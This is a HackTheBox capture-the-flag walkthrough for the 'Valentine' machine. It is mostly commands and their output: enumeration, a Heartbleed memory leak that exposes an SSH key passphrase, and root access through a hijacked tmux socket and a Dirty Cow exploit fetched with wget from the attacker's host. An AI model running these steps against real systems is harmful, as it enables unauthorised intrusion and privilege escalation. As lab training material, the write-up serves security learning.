---
layout: post
title: HackTheBox Valentine
date: 2018-02-17
tags: [HackTheBox, Linux]
---

# Machine Synopsis

Valentine is a very unique medium difficulty machine which focuses on the Heartbleed vulnerability, which had devastating impact on systems across the globe. ([Source](https://www.hackthebox.com/machines/valentine))

# Enumeration

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Valentine]
└─# nmap -sC -sV -A -p- 10.10.10.79
Nmap scan report for 10.10.10.79
Host is up (0.0038s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_ssl-date: 2022-07-04T11:46:25+00:00; 0s from scanner time.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=7/4%OT=22%CT=1%CU=30488%PV=Y%DS=2%DC=T%G=Y%TM=62C2D311
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=8)OPS(
OS:O1=M550ST11NW4%O2=M550ST11NW4%O3=M550NNT11NW4%O4=M550ST11NW4%O5=M550ST11
OS:NW4%O6=M550ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=3890)ECN(
OS:R=Y%DF=Y%T=40%W=3908%O=M550NNSNW4%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=3890%S=O%A=S+%F=AS%O=M550ST11NW4%RD=0
OS:%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z
OS:%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RI
OS:PL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT     ADDRESS
1   4.10 ms 10.10.14.1
2   4.31 ms 10.10.10.79

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.60 seconds
```

Seems like there’s website running on port `80` and `443`.

The `http` version shows the following image.

![website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Valentine/website.png?raw=true)

The `https` version results in the same picture.

![https_website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Valentine/https_website.png?raw=true)

Running `gobuster` on the website showed an interesting `/omg` and `/dev` directory.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Valentine]
└─# gobuster dir -u http://10.10.10.79 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k -x html,js,php,txt,py
...
/index                (Status: 200) [Size: 38]
/index.php            (Status: 200) [Size: 38]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.79/dev/]
/encode               (Status: 200) [Size: 554]                              
/encode.php           (Status: 200) [Size: 554]                              
/decode               (Status: 200) [Size: 552]                              
/decode.php           (Status: 200) [Size: 552]                              
/omg                  (Status: 200) [Size: 153356]                           
/server-status        (Status: 403) [Size: 292]
...
```

The `/omg` directory returns the image again while the `/dev` directory had some interesting files.

![dev](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Valentine/dev.png?raw=true)

Here is the content of the `notes.txt`.

```
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Valentine]
└─# cat notes.txt  
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

Here is the content of `hype_key`.

```
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Valentine]
└─# cat hype_key            
2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 63 77 6e 53 64 64 48 57 38 57 33 4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 62 53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 49 44 76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d
```

It looks like some hex values for something. Lets try to convert it into ASCII.

```
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Valentine]
└─# cat hype_key | xxd -r -p > hype_key_decoded
                                         
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Valentine]
└─# cat hype_key_decoded                       
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----    
```

It seems to be a RSA private key!

Anyway, since there’s nothing much left we could do, lets run a `nmap` scan with the `vuln` script!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Valentine]
└─# nmap -p- 10.10.10.79 --script=vuln 
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.79
Host is up (0.0043s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /index/: Potentially interesting folder
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-dombased-xss: Couldn't find any DOM based XSS.
443/tcp open  https
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140407.txt 
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|_      http://cvedetails.com/cve/2014-0160/
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.securityfocus.com/bid/70574
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|_http-dombased-xss: Couldn't find any DOM based XSS.
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       http://www.openssl.org/news/secadv_20140605.txt
|       http://www.cvedetails.com/cve/2014-0224
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /index/: Potentially interesting folder

Nmap done: 1 IP address (1 host up) scanned in 66.65 seconds
```

Oh? There seems to be an interesting Heartbleed Bug vulnerability for port `443`!

As a ~~lazy~~ efficient student, I Googled for an easy explanation of the heartbleed bug by [xkcd](https://xkcd.com/1354/).

![heartbleed_explanation](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Valentine/heartbleed_explanation.png?raw=true)

# Exploit

A Google search of `heartbleed python` resulted in this GitHub [Gist](https://gist.github.com/eelsivart/10174134).

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Valentine]
└─# cat heartbleed.py
...
options = OptionParser(usage='%prog server [options]', description='Test and exploit TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
options.add_option('-n', '--num', type='int', default=1, help='Number of times to connect/loop (default: 1)')
options.add_option('-s', '--starttls', action="store_true", dest="starttls", help='Issue STARTTLS command for SMTP/POP/IMAP/FTP/etc...')
options.add_option('-f', '--filein', type='str', help='Specify input file, line delimited, IPs or hostnames or IP:port or hostname:port')
options.add_option('-v', '--verbose', action="store_true", dest="verbose", help='Enable verbose output')
options.add_option('-x', '--hexdump', action="store_true", dest="hexdump", help='Enable hex output')
options.add_option('-r', '--rawoutfile', type='str', help='Dump the raw memory contents to a file')
options.add_option('-a', '--asciioutfile', type='str', help='Dump the ascii contents to a file')
options.add_option('-d', '--donotdisplay', action="store_true", dest="donotdisplay", help='Do not display returned data on screen')
options.add_option('-e', '--extractkey', action="store_true", dest="extractkey", help='Attempt to extract RSA Private Key, will exit when found. Choosing this enables -d, do not display returned data on screen.')
...

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Valentine]
└─# python heartbleed.py 10.10.10.79 -n 100
...
$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==&..~..^.......x..RG
```

After spamming the server with 100 requests, it returns us with an interesting value called `$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==`.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Valentine]
└─# echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d 
heartbleedbelievethehype
```

I’m guessing this should be the password for for ssh?

Before we begin, we need to decrypt the RSA private key.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Valentine]
└─# openssl rsa -in hype_key_decoded -out hype_key_decrypted 
Enter pass phrase for hype_key_decoded: heartbleedbelievethehype
writing RSA key
```

Finally, lets run SSH!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Valentine]
└─# ssh -i hype_key_decrypted hype@10.10.10.79
The authenticity of host '10.10.10.79 (10.10.10.79)' can't be established.
ECDSA key fingerprint is SHA256:lqH8pv30qdlekhX8RTgJTq79ljYnL2cXflNTYu8LS5w.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.79' (ECDSA) to the list of known hosts.

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'hype_key_decrypted' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
```

>   The user `hype` is just another guess since the key name was `hype_key`.

Oops, we forgot to change the permissions of the RSA file!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Valentine]
└─# chmod 400 hype_key_decrypted

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Valentine]
└─# ssh -i hype_key_decrypted hype@10.10.10.79
sign_and_send_pubkey: no mutual signature supported
```

Weird.. it seems to be showing some error.

Luckily, there was a way to bypass this error using `-o 'PubkeyAcceptedKeyTypes +ssh-rsa'`!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Valentine]
└─# ssh -i hype_key_decrypted hype@10.10.10.79 -o 'PubkeyAcceptedKeyTypes +ssh-rsa'
...
hype@Valentine:~$ 
```

# Privilege Escalation

## Method 1 - Tmux

```bash
- Terminal -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Valentine]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.79 - - [04/Jul/2022 20:45:42] "GET /LinEnum.sh HTTP/1.1" 200 -

- SSH -
hype@Valentine:~$ cd /tmp
hype@Valentine:/tmp$ wget http://10.10.14.29/LinEnum.sh
hype@Valentine:/tmp$ chmod +x LinEnum.sh 
hype@Valentine:/tmp$ ./LinEnum.sh
[-] Process binaries and associated permissions (from above list):
936K -rwxr-xr-x 1 root root 933K Apr  3  2012 /bin/bash
 32K -rwxr-xr-x 1 root root  32K Mar 29  2012 /sbin/getty
160K -rwxr-xr-x 1 root root 160K Apr 16  2012 /sbin/init
136K -rwxr-xr-x 1 root root 135K Apr  5  2012 /sbin/udevd
416K -rwxr-xr-x 1 root root 413K Feb 13  2012 /usr/bin/tmux

hype@Valentine:/tmp$ ps -ef 
UID         PID   PPID  C STIME TTY          TIME CMD
...
root       1023      1  0 04:43 ?        00:00:01 /usr/bin/tmux -S /.devs/dev_sess
...
```

>   `ps -ef`: Select all processes and Do full-format listing.

It seems like we can just run `tmux -S /.devs/dev_sess` to get privilege Escalation!

```bash
hype@Valentine:/tmp$ tmux -S /.devs/dev_sess
root@Valentine:/tmp# cd /home
root@Valentine:/home# ls
hype
root@Valentine:/home# cat hype/Desktop/user.txt 
e6710a5464769fd5fcd216e076961750
root@Valentine:/home# cat /root/root.txt 
f1bb6d759df1f272914ebbc9ed7765b2
```

## Method 2 - Dirty Cow

```bash
hype@Valentine:~$ uname -a
Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
```

Googling `site:exploit-db.com 3.2.0-23-generic` shows that we could use Dirty Cow [exploit](https://www.exploit-db.com/exploits/40839) to get privilege escalation.

```bash
- Terminal -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Valentine]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.79 - - [04/Jul/2022 21:45:57] "GET /dirty.c HTTP/1.1" 200 -

- SSH -
hype@Valentine:/tmp$ wget http://10.10.14.29/dirty.c
hype@Valentine:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
hype@Valentine:/tmp$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:figsoZwws4Zu6:0:0:pwned:/root:/bin/bash

mmap: 7f3d55c14000
^C
hype@Valentine:/tmp$ su firefart
Password: 
firefart@Valentine:/tmp# id
uid=0(firefart) gid=0(root) groups=0(root)
```
